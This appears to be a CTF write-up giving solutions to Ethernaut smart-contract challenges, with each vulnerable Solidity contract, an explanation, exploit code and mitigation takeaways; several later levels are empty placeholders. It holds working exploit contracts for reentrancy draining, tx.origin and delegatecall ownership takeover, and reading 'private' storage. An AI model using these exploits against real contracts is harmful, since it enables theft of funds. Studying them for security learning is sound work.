# Challenges
1. [Fallback](#1-fallback)
2. [Fallout](#2-fallout)
3. [Coin Flip](#3-coin-flip)
4. [Telephone](#4-telephone)
5. [Token](#5-token)
6. [Delegation](#6-delegation)
7. [Force](#7-force)
8. [Vault](#8-vault)
9. [King](#9-king)
10. [Re-entrancy](#10-re-entrancy)
11. [Elevator](#11-elevator)
12. [Privacy](#12-privacy)
13. ~[Gatekeeper One]~
14. ~[Gatekeeper Two]~
15. [Naught Coin](#15-naught-coin)
16. [Preservation](#16-preservation)
17. [Recovery](#17-recovery)
18. [MagicNumber](yet to update)
19. ~[Alien Codex]~
20. [Denial](yet to update)
21. [Shop](yet to update)
22. [Dex](yet to update)
23. [Dex Two](yet to update)
24. ~[Puzzle Wallet]~
25. ~[Motorbike]~
26. ~[DoubleEntryPoint]~
27. ~[Good Samaritan]~
28. ~[Gatekeeper Three]~
29. ~[Switch]~
# 1. Fallback
### Challenge
- Claim ownership of the contract.
- Reduce its balance to 0.
### Purpose
To know the basics of how ether goes in and out of contracts, including the usage of the fallback method.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
### Solution
##### Explanation
**Receive function:** It executes on calls to the contract with no calldata, e.g. calls made via send() or transfer(). This is a function triggered when a contract receives ether without any calldata. [solidity doc link](https://docs.soliditylang.org/en/v0.8.20/contracts.html#receive-ether-function)\
\
How can we exploit this? There are two ways to claim ownership here: contribute to the contract more than the current owner (or) exploit the faulty check-in receive function. If we have any value of contribution and send any amount of ether to the contract, we will claim the ownership.
##### Exploit
All we need is a test ETH of 2 wei for the contract and the required test ETH for gas. I used `Remix IDE` (other options Etherscan, Hardhat, etc).
1. Invoke `contribute()` function with 1 wei. This will satisfy `contributions[msg.sender] > 0` condition
2. Send `1 wei` to the contract address. Ownership is transferred.
3. Since ownership is changed we can access `withdraw()` with `onlyOwner` modifier. Call `withdraw()` to drain the contract balance.\
\
Congratulations! We successfully became the owner of the `Fallback contract` and stole the balance in it.

# 2. Fallout
### Challenge
- Claim ownership of the contract
### Purpose
Keep upto date with solidity updates.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
### Solution
##### Explanation
**Solidity v0.5.0 Breaking Changes:** Constructor needs to be defined using the `constructor` keyword instead defining a function with the same name as the contract. [solidity doc link](https://docs.soliditylang.org/en/v0.8.20/050-breaking-changes.html#constructors)\
Solidity compiler throws an error if there is a function with the name of the contract. That's the reason here they misspelled the `Fal1out` for `Fallout`. Since this uses a version above 0.5.0, the `constructor` keyword must be used for the constructor. This makes the function `Fal1out` just a normal function that can be called by anyone.
##### Exploit
1. Call `Fal1out()` and the ownership is changed.\
\
Hurray! We got another ownership.

# 3. Coin Flip
### Challenge
- Predict the outcome coin flip 10 times in a row.
### Purpose
Understanding generating random numbers in solidity and their potential threat. 
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
### Solution
##### Explanation
There currently isn't a native way to generate them, and everything we use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like block hashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.\
I created another contract to attack `CoinFlip` by exploiting the same logic and factor used in it. Making an external call from an attack contract sends one transaction so that both will have the same block information. So, we can predict the ouput of `flip()` and pass that as argument to pass the condition.
##### Exploit
```
import "./CoinFlip.sol"

contract AttackCoinFlip {
    CoinFlip public immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _target) {
        target = _target; // instance of the CoinFlip contract to be attacked
    }

    // Attack function
    function attack() public {
        // Logic implementation used in flip() of CoinFlip
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        // Attacking contract
        bool attackSuccess = target.flip(guess);
        require(attackSuccess, "Attack failed");
    }
}
```
1. Deploy the `AttackCoinFlip` contract with `CoinFlip` address as an argument.
2. Invoke `attack()` 10 times to increase `consecutiveWins` state variable in CoinFlip contract (check whether `consecutiveWins` has a value minimum of 10).\
\
Submit the contract instance on Ethernaut to claim the win.
##### Takeaway
To get cryptographically proven random numbers, we can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.\
Some other options include using Bitcoin block headers (verified through BTC Relay, RANDAO, or Oraclize).

# 4. Telephone
### Challenge
- Claim ownership of the contract
### Purpose
Understanding the potential threat of using `tx.origin` for access check and potential phishing attacks using this. [link](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks)
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
### Solution
##### Explanation
**tx.origin-** Gives address of the EOA that initiated the tx (only EOA can initiate tx as of now). [link](https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#tx-origin)https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#tx-origin
**msg.sender-** Gives address of the account that is called current message/tx.\
```
EOA -> contract A -> contract B
```
In the above illustration, msg.sender and tx.origin of contract A is the EOA. Whereas for contract B, msg.sender is contract A and tx.origin is EOA. Since the `Telephone` contract only checks for the tx originator not to be equal to the message sender, one middle contract is enough to claim the ownership.
##### Exploit
```
contract AttackTelephone {
    constructor(Telephone target) {
      target.changeOwner(tx.origin);
        require(target.owner() == msg.sender, "Attack failed");
    }
}
```
1. Deploy the above contract with the `Telephone` contract instance as a constructor parameter.
Just like that ownership is transferred.
##### Takeaway
It is recommended to use `msg.sender` for access checks instead of `tx.origin`. Phishing attack like fooling a user to send tx for different purposes and making an internal tx to the target contract leads to passing checks that use `tx.origin`.

# 5. Token
### Challenge
- Hack Token contract to get additional tokens than allotted.
### Purpose
Know the risk of integer overflow/underflow in solidity.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
### Solution
##### Explanation
Before solidity v0.8.0, there is no default check for integer overflow/underflow ([link](https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html#solidity-v0-8-0-breaking-changes)).\
Require statement in the `transfer` function of the `Token` contract subtracts value from the message sender's balance. Since this contract uses version 0.6.0, subtraction below 0 will be wrapped to the upper bound of uint256. Instance owners invoking the `transfer` function with any value greater than 20 (by default we are provided with 20 tokens) can spike their token balance.
##### Exploit
1. Get the instance of the contract in Remix.
2. Call transfer function with "_to" address can be anything other than the invoker and the second argument value to be greater than 20.
3. Now the balance of the invoker is wrapped to the upper bound of uint256.
Yaay! We got our hands over a huge amount of tokens
##### Takeaway from Ethernaut
Overflows are very common in solidity and must be checked for with control statements such as:\
```
if(a + c > a) {
  a = a + c;
}
```
An easier alternative is to use OpenZeppelin's SafeMath library which automatically checks for overflows in all the mathematical operators. The resulting code looks like this:\
```
a = a.add(c);
```
If there is an overflow, the code will revert.

# 6. Delegation
### Challenge
- The goal of this level is to claim ownership of the given instance.
### Purpose
Understanding how `delegatecall` works in solidity.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
### Solution
##### Explanation
`delegatecall` calls a contract without changing the context of the caller contract. This means storage and message are the same as the caller contract. Read more about delegate calls [here](https://solidity-by-example.org/delegatecall/). Whenever a contract is called with unmatched methodId, a fallback function is triggered. Read more on fallback [here](https://www.educative.io/answers/what-is-the-fallback-function-in-solidity).\
With an instance with a `Delegate` contract ABI, we can easily change the owner since the challenge instance is for `Delegation`. In the remix, we can do this by selecting the `Delegate` contract and getting the instance at the `Delegation` contract address. This way ABI is matching to `Delegate`.\
If we call `pwn()` from the instance, the contract wouldn't recognize since the Delegation contract doesn't have any matching methodId. This will trigger the fallback in Delegation which takes `msg.data` as an argument (msg.data is the methodId). Since the msg.sender will be not changing and the storage slot of the owner is the same for both contracts, the owner in Delegation will be changed.
##### Exploit
1. Get an instance at `Delegation` contract address with `Delegate` contract ABI.
2. Call the `pwn()` and the owner of the Delegation will be changed.
Note: change the gas limit to a higher value since the recommended gas limit in the metamask is not sufficient for this challenge.
##### Takeaway from Ethernaut
The usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.\
Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.

# 7. Force
### Challenge
- The goal of this level is to make the balance of the contract greater than zero.
### Purpose
To account for different ways a contract balance can be manipulated.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
### Solution
##### Explanation
There are two ways to send ether to a contract without their permission. One is via the coinbase account where the miner provides a contract address instead of theirs to get a minning reward. Another way is through `selfdestruct`.\
When a contract self-destructs, it can provide an address to send the balance in it. Creating a contract with balance and self-destructing it by providing the instance address will clear this challenge.
##### Exploit
```
contract AttackForce {
    Force public immutable targetContractAddress;

    constructor(Force _targetContractAddress) payable {
        targetContractAddress = _targetContractAddress;
    }

    function attack() external {
        selfdestruct(payable(targetContractAddress));
        assert(targetContractAddress.balance > 0);
    }
}
```
1. Deploy the above contract with 1 wei.
2. Call `attack()` to self-destruct and send the balance to the `Force` contract.\
That's it, now the `Force` contract has a non-zero balance (you can check it in Etherscan).
##### Takeaway from Ethernaut
In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.\
However, there is no way to stop an attacker from sending ether to a contract by self-destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

# 8. Vault
### Challenge
- Make the `locked` variable `false`.
### Purpose
Nothing is private in Ethereum Blockchain.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
### Solution
##### Explanation
Whenever a variable is made private in a contract, it is only not accessible by other contracts. It does not mean it's hidden, everything in the blockchain is publically available. We can look into the public ledger to find what is `password`. I used injected web3 available in the browser, we can use any provider or online tools such as Alchemy.
##### Exploit
```
await web3.eth.getStorageAt(contract.address, 1)
```
1. In the Ethernaut Vault challenge page, type the above script in the browser console. (`getStorageAt` takes the contract address as the first argument and the slot number as the second argument, then returns the data in that slot. Here the `password` is in `slot 1`. read about storage layout [here](https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html#storage-inplace-encoding))
2. Copy the value of the resulting bytes.
3. In Remix, get the instance of the Vault contract and call `unlock()` with the copied value.\
Now the `locked` variable should be `false`.
##### Takeaway from Ethernaut
It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.\
To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will be visible to anyone looking for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

# 9. King
### Challenge
- Make the contract no longer able to change king.
### Purpose
Understanding the misusage of ether transfer.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```
### Solution
##### Explanation
Calling address can be a contract. The `King` contract does not use any pattern to avoid it from being a victim of a DOS attack. If we create a contract with ether equivalent of `prize` and send the same to `King`, it will become a new king. Then all we need is a payable fallback function that reverts whenever triggered since `King` will transfer the amount to this contract whenever someone tries to become a new king.
##### Exploit
```
contract Attack_King {
  address public targetContractAddress;

  constructor(address _targetContractAddress) payable {
    targetContractAddress = _targetContractAddress;
    (bool success,) = targetContractAddress.call{value: address(this).balance}("");
    require(success, "call failed");
  }

  fallback() external payable {
    revert();
  }

  receive() external payable {
    revert();
  }
}
```
1. Deploy the above contract with the `king` contract address as the constructor argument.\
And we are done. It can no longer change the king despite the value of the ether sent.
##### Takeaway from Ethernaut
Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that happened — a real hack or a real bug.\
In this case, see [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

# 10. Re-entrancy
### Challenge
- The goal of this level is to steal all the funds from the contract.
### Purpose
Understanding Re-entrancy attack.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
### Solution
##### Explanation
`withdraw()` in the `Reentrance` contract uses `call` to send the amount. And it changes the balance after sending the amount. If the withdrawer is a contract, it can re-enter by calling withdraw function from its fallback or receive function since the balance is yet to be updated.
##### Exploit
```
contract AttackReentrance {
  Reentrance public target;

  constructor(Reentrance _target) public {
    target = _target;
  }

  receive() external payable {
    if(targetBalance() > 0) {
      target.withdraw(targetBalance());
    }
  }

  function attack() external payable {
    target.donate{value: targetBalance()}(address(this));
    target.withdraw(targetBalance());
    (bool success,) = msg.sender.call{value: address(this).balance}("");
    require(success, "transfer failed");
  }

  function targetBalance() public view returns(uint256) {
    return address(target).balance;
  }
}
```
1. Deploy the above contract with the `Reentrance` instance as an argument.
2. Call `attack()` to donate and trigger re-entrance. (I used to donate the same balance in the Reentrance contract to pass the check condition while attacking)\
Hurray! We now know how classic re-entrance works. Read the below mitigations to avoid this.
##### Takeaway from Ethernaut
To prevent re-entrance attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.\
`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).\
Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.\
\
Re-entrancy is a common attack. You should always be prepared for it!\
\
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).

# 11. Elevator
### Challenge
- Make `top` in the `Elevator` contract true.
### Purpose
Never trust a contract address without verifying its source code.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
### Solution
##### Explanation
The `goTo` function in `Elevator` uses the `Building` interface which doesn't have an implementation and blindly uses the method `isLastFloor`. We need to create a contract that adheres to the interface but gives the implementation that returns false for the first call of `isLastFloor` and true for the remaining to clear this level.
##### Exploit
```
contract AttackElevator {
    Elevator public target;
    uint256 public floor;

    constructor(Elevator _target) {
        target = _target;
    }

    function isLastFloor(uint256 _floor) external returns(bool) {
        
            floor++;
            return floor > 1;
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "Attack failed");
    }
}
```
1. Deploy the above contract with the `Elevator` instance as an argument.
2. Call `attack()` to make `top` true.
##### Takeaway from Ethernaut
You can use the view function modifier on an interface to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.\
An alternative way to solve this level is to build a view function that returns different results depending on input data but doesn't modify the state, e.g. gasleft().

# 12. Privacy
### Challenge
- Make the boolean value of `locked` false.
### Purpose
Nothing in the Ethereum blockchain is private.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  // A bunch of super-advanced solidity algorithms...
}
```
### Solution
##### Explanation
This is similar to Vault Challenge. First, we need to find the storage slot of the second index of the `data` variable since that is the value needed to unlock. By [storage layout](https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html#storage-inplace-encoding) of solidity, the slot is **5**. Again I am using injected Web3 provider available in the browser to get the bytes data in that slot and slice them to the first 16 bytes to clear the check condition.
##### Exploit
```
data = await web3.eth.getStorageAt(contract.address, 5)
data.slice(0, 2 + 16 * 2)
```
1. Paste the above script into the browser console. (we need the first 16 bytes which is the first 32 characters in the hex plus "0x" prefix, so in total first 34 char of data).
2. Copy the Hex values from the console.
3. Call `unlock()` with the copied value.\
Now the `locked` value should be false.
##### Takeaway from Ethernaut
The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.\
It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)

# 13. Gatekeeper One
### Challenge
- 
### Purpose

### Contract
```

```
### Solution
##### Explanation

##### Exploit
```

```
##### Takeaway from Ethernaut

# 14. Gatekeeper Two
### Challenge
- 
### Purpose

### Contract
```

```
### Solution
##### Explanation

##### Exploit
```

```
##### Takeaway from Ethernaut

# 15. Naught Coin
### Challenge
- To bring our token balance to 0.
### Purpose
Understand the ERC20 token standard.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```
### Solution
##### Explanation
This is challenge is to understand [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20) (this [resource](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20) helps to understand openzeppelin ERC20 implementation).\
We cannot use `transfer` because of the timelock. But we can allow a contract to transfer our tokens using the `approve` and `transferFrom` functions of ERC20. We need to create a contract and approve it to transfer all the tokens in our balance.
##### Exploit
```
contract HackNaughtCoin {
    NaughtCoin public immutable target;

    constructor(NaughtCoin _target) {
        target = _target;
    }
    function attack() external {
        uint balance = target.balanceOf(msg.sender);
        target.transferFrom(msg.sender, address(this), balance);
    }
}
```
1. Get the instance of `NaughtCoin` in Remix and get the balance of tokens in our address which is the token amount for allowance.
2. Deploy the above contract and get the address of it.
3. Call the `approve` function in `NaughtCoin` with the `HackNaughtCoin` contract address and token amount as arguments.
4. Call `attack()` in `HackNaughtCoin` to transfer all the tokens to itself.\
Now the balance of tokens we hold is **0**.
##### Takeaway from Ethernaut
When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.

# 16. Preservation
### Challenge
- The goal of this level is for you to claim ownership of the instance given.
### Purpose
Understand the risk delegate call in storage variables.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
### Solution
##### Explanation
Refer [Delegation](#6-delegation) level to know about delegatecall and its risks. `Preservation` makes a delegatecall to `LibraryContract` to set `storedTime` variable, but LibraryContract doesn't maintain same storage layout as Preservation contract. Therefore delegatecall to `setTime()` will change `timeZone1Library` variable. Providing a **uint** conversion of a desired contract address to `setFirstTime()` will change the timeZone1Library. We can call set proper storage layout and method in that contract to change the `owner` by calling `setFirstTime()` again.
##### Exploit
```
contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "Attack failed!");
    }

    function setTime(uint _addressUint) external {
        owner = address(uint160(_addressUint));
    }
}
```
1. Deploy the above contract.
2. Call `attack()` with `Preservation` instance address as argument.\
(It first sets the `timeZone1Library` with attack contract address. Next `setFirstTime()` call delegates to `AttackPreservation` contract which changes the `owner` since the storage layout matched with Preservation contract.
##### Takeaway from Ethernaut
As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

# 17. Recovery
### Challenge
- This level will be completed if we can recover (or remove) the 0.001 ether from the lost contract address.
### Purpose
Know how contract address created.
### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```
### Solution
##### Explanation
There is a factory contract that has been called to create a new contract instance. Someone deposited funds on this contract instance but “forgot the address”. Our goal is to find out what address the contract was deployed to and call its `destroy` function.\
The address of a contract is created from the sender and tx's nonce. In this case, the `Recovery` address and the nonce while creating `SimpleToken` which is **1**. Using ethers, a call to `getContractAddress` is enough to get the lost address.
##### Exploit
```
const lostContractAddress = ethers.utils.getContractAddress({
  from: recoveryContract.address,
  nonce: BigNumber.from(`1`),
})
```
1. Get the lost contract address from the above script.
2. Call `destroy()` on it.
##### Takeaway from Ethernaut
Contract addresses are deterministic and are calculated by `keccak256(address, nonce)` where the `address` is the address of the contract (or Ethereum address that created the transaction) and `nonce` is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).\
Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.\
\
An interesting [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.\
If you're going to implement this technique, make sure you don't miss the nonce or your funds will be lost forever.

# 18. MagicNumber
### Challenge
- 
### Purpose

### Contract
```

```
### Solution
##### Explanation

##### Exploit
```

```
##### Takeaway from Ethernaut

# 19. Alien Codex
### Challenge
- 
### Purpose

### Contract
```

```
### Solution
##### Explanation

##### Exploit
```

```
##### Takeaway from Ethernaut

# 20. Denial
### Challenge
- 
### Purpose

### Contract
```

```
### Solution
##### Explanation

##### Exploit
```

```
##### Takeaway from Ethernaut

